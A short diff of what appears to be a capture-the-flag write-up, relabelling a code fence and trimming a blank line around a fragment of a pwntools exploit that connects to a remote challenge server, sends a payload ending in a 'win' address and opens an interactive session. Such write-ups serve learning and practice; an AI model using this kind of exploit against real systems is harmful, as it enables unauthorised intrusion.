@@ -4,7 +4,7 @@
 ---
 
 
-```
+```js
 from pwn import *
 
 r = remote('45.122.249.68', 10018)
@@ -29,7 +29,6 @@ payload += p32(win)
 
 r.sendline(payload)
 r.interactive()
-
 ```
 
 ![flag](images/flag.png)
